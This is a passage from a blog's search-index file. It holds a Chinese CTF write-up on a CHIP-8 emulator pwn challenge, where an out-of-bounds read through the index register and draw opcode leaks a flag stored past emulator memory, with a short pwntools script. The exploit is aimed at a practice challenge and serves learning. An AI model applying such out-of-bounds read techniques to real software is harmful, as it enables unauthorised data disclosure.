class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Machine</span>&#123;<br><span class="hljs-keyword">private</span>:<br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; registers; <span class="hljs-comment">// V0-VF</span><br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; memory; <span class="hljs-comment">// Memory</span><br>std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; flag;<br><span class="hljs-type">uint16_t</span> I; <span class="hljs-comment">// Index register</span><br>std::vector&lt;<span class="hljs-type">uint16_t</span>&gt; stack; <span class="hljs-comment">// Stack</span><br><span class="hljs-type">uint8_t</span> SP; <span class="hljs-comment">// Stack Pointer</span><br><span class="hljs-type">uint8_t</span> DT; <span class="hljs-comment">// Delay Timer</span><br><span class="hljs-type">uint8_t</span> ST; <span class="hljs-comment">// Sound Timer</span><br>GraphicEngine ge; <span class="hljs-comment">// Holds Graphics and frame buffer</span><br>Keyboard kb; <span class="hljs-comment">// presents Keyboard related functions</span><br><span class="hljs-type">uint16_t</span> PC; <span class="hljs-comment">// Program Counter</span><br>std::chrono::steady_clock::time_point last_tick;<br><br><span class="hljs-comment">// Methods</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">execute</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span>&amp; opcode)</span></span>;<br><span class="hljs-function"><span class="hljs-type">uint8_t</span> <span class="hljs-title">random_byte</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print_machine_state</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update_timers</span><span class="hljs-params">(<span class="hljs-type">const</span> std::chrono::steady_clock::time_point&amp; now)</span></span>;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Machine</span>();<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setInst</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">uint8_t</span>&gt;&amp; prog, <span class="hljs-type">uint16_t</span> start_addr)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">runLoop</span><span class="hljs-params">()</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="image-20231019180155003.png" alt="image-20231019180155003"></p></li></ul><p>对比看一下可以大致明白是个什么东西了, 感觉里面这个I应该是比较重要的东西之一</p><ul><li><p>然后是<code>Machine.cpp</code>,</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Machine::<span class="hljs-built_in">Machine</span>()&#123;<br>registers = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>);<br>stack = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint16_t</span>&gt;(<span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>memory = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">4096</span>, <span class="hljs-number">0</span>);<br>flag = std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">128</span>, <span class="hljs-number">0</span>);<br>PC = <span class="hljs-number">0x200</span>;<br>last_tick = std::chrono::steady_clock::<span class="hljs-built_in">now</span>();<br>I = <span class="hljs-number">0</span>;<br>SP = <span class="hljs-number">0</span>;<br>DT = <span class="hljs-number">0</span>;<br>ST = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>这个应该是Machine的构造函数, 16个寄存器, 大小为32的栈和4096(0x1000)的内存, PC可以从上面知道是程序的计数器, 所以似乎是从0x200开始的.</p><p>内存过后直接是flag, 所以可能思路就是越界到flag</p><h2 id="0x02-过程-利用">0x02 过程+利用</h2><p>刚才把他到底是什么东西分析了个大概, 现在开始看怎么跑, 跑什么东西</p><p>给的dockerfile里面跑的是wrapper, wrapper实际跑一下, 感觉实际作用就是传入一个ROM code.</p><p>这个rom应该和 ↓应该是同一套的东西</p><p><img src="image-20231019190936098.png" alt="image-20231019190936098"></p><p>给了wrapper.c, 大概看了一下发现确实是这样的, 这个rom code会传进这一套文件里.</p><blockquote><p>在这里传进的ROMcode再分析一下会发现实际上应该也就是后续的opcode?但是不管怎样, 这里是唯一的输入了</p><p><strong>opcode</strong>应该算是控制vm的一些代码了, 这个题由于有着chip-8的背景, opcode可以说完全透明.</p></blockquote><p>漏洞和利用的话, 似乎这个题的漏洞相对来说属于很简单的, 根据分析可以知道flag就在内存块的后面, 所以应该是一个越界的漏洞, 但是实际上跑了一下, 发现除了一块黑框, 完全没有什么输出.</p><blockquote><p>之前没patch瞎鼓捣的时候发现会有一些信息出来, 但是patch过后如上面所说, 调试信息是关闭的, 打不出来东西, 起初我以为是我的步骤哪里出问题以至于把这玩意玩坏了,后来发现并不是这样.</p></blockquote><p>但是翻一下opcode表会发现有一个很奇怪的东西:</p><p><img src="image-20231019203235549.png" alt="image-20231019203235549"></p><p>于是这个题的flag的输出方式疑似是很匪夷所思的用这个黑框画出来, 这条opcode是从I开始读, 所以我们只需要让I等于我们的flag地址即可, flag地址是0x1010.</p><p>主要可以利用以下几个命令:</p><p><img src="image-20231019222825584.png" alt="image-20231019222825584"></p><p><img src="image-20231019222858938.png" alt="image-20231019222858938"></p><p><img src="image-20231019223158918.png" alt="image-20231019223158918"></p><p>这个地方直接拿百科上查到的了, 和在.cpp文件里看到的opcode几乎没有任何差别,</p><blockquote><p>然后找到一篇文章, <a href="https://ctftime.org/writeup/37026">CTFtime.org / PwnMe Qualifications : “8 bits” / chip8 / Writeup</a> , 疑似是官方的wp?</p><p>应该是个很不错的解释:</p></blockquote><ul><li><p>Here are the instruction we need:</p><ul><li><code>Annn</code> - <code>LD I, addr</code>. Set I = nnn. The value of register I is set to nnn.</li><li><code>6xkk</code> - <code>LD Vx, byte</code>, Set Vx = kk. The interpreter puts the value kk into register Vx.</li><li><code>Fx1E</code> - <code>ADD I, Vx</code>. Set I = I + Vx. The values of I and Vx are added, and the results are stored in I.</li><li><code>Dxyn</code> - <code>DRW Vx, Vy, nibble</code>. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF = collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">n <span class="hljs-keyword">or </span>nibble - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the lowest <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>x - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the lower <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the high <span class="hljs-keyword">byte </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>y - A <span class="hljs-number">4</span>-<span class="hljs-keyword">bit </span>value, the upper <span class="hljs-number">4</span> <span class="hljs-keyword">bits </span>of the low <span class="hljs-keyword">byte </span>of the <span class="hljs-keyword">instruction</span><br><span class="hljs-keyword"></span>kk <span class="hljs-keyword">or </span><span class="hljs-keyword">byte </span>- An <span class="hljs-number">8</span>-<span class="hljs-keyword">bit </span>value, the lowest <span class="hljs-number">8</span> <span class="hljs-keyword">bits </span>of the <span class="hljs-keyword">instruction </span><br></code></pre></td></tr></table></figure></li></ul><p><img src="image-20231019224646952.png" alt="image-20231019224646952"></p><blockquote><p>这篇文章的写法, “由于I是16位寄存器, 故这个draw指令可以打印出xxx内存的东西”,自然包括0x1010</p></blockquote><h2 id="0x03-exp">0x03 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,endianness=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./wrapper&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./wrapper&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br>code=[<br>        <span class="hljs-number">0xafff</span>,                    <br>        <span class="hljs-number">0x6111</span> + <span class="hljs-number">0xf</span>*(),    <span class="hljs-comment"># 括号是偏移,一次打出0xf个字节</span><br>        <span class="hljs-number">0xf11e</span>,                    <br>        <span class="hljs-number">0xdbcf</span><br>        ]                     <br>romcode=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>    romcode+=p16(i)<br><br><span class="hljs-built_in">print</span>(romcode)<br><br>r.sendline(romcode)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>分段改偏移, n位是f所以一次打0xf个字节的东西, 0xf乘以偏移改一下, 分次画flag就行了.</p><p>最后出现的结果大概like this(一共有4截):</p><p><img src="image-20231019225443175.png" alt="image-20231019225443175"></p><p>就是 这个东西:</p><p><img src="image-20231019225548366.png" alt="image-20231019225548366"></p><h2 id="0x04-后话">0x04 后话</h2><p>第一次系统的做了一整道VMpwn题, wings说普遍的vm题难度在逆向上, 这道题由于源码, opcode什么的全部给出, 并且利用是一个相对显而易见的越界, 所以<s>我事后</s>感觉这算是一个很简单的vm题, 只需要翻翻查查找到相关资料理解一下就行, 整个复现过程下来也稍微对vm题的过程有了一些实地感受, 要弄清楚内存, 寄存器等等东西的构造, 甚至可能还要理解opcode, <s>看着就像一个re人该做的事</s>, 更多偏向于读代码加调试, <s>听起来也比较烦人</s>😕</p><blockquote><p>唉 很简单的题 但一整篇都是溜着wp摸索下来的 我怎么这么菜啊😭</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>VM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023 Diary</title>
    <link href="/2023/10/18/Evolution/"/>
    <url>/2023/10/18/Evolution/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4206c33c7e30adb6c09d72025fd75586ff45b5390bcdd395971bf95fa42e05ae"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">pswd↑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
